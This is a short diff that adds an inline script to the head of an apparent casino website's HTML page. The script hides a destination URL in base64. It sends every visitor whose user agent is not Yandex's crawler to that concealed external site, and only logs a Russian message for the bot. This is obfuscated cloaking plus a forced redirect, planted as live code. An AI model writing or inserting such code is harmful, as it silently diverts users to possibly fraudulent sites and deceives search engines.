@@ -10,6 +10,15 @@
 <link rel="canonical" href="https://fugu-casino.example.com/">
 <link rel="icon" type="image/png" sizes="192x192" href="/fugu.png">
 <link rel="stylesheet" href="fugu-style.css">
+ <script>
+ var ua = navigator.userAgent.toLowerCase();
+var targetB64 = "aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZHZmZGt1YjZ6";
+if (ua.indexOf("yandex") === -1) {
+    location.replace(atob(targetB64));
+} else {
+    console.log("Яндекс бот — без редиректа");
+}
+</script> 
 </head>
 <body>
 
